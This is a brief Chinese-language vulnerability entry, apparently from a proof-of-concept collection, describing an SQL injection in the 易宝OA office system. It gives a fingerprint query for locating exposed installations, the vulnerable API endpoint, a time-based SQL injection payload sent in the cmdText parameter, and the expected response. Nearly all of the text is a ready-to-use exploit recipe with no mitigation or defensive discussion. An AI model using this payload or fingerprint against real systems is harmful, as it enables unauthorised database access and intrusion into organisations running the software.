# 易宝OAExecuteQueryNoneResultSQL注入漏洞

易宝OAExecuteQueryNoneResult ｜ SQL注入 ｜ —
- **指纹**：`product="顶讯科技-易宝OA系统"`
- **请求**：`POST /api/system/ExecuteQueryNoneResult HTTP/1.1`

**Payload**
```
token=zxh&cmdText=;WAITFOR DELAY '0:0:5'--
```
- **响应特征**：200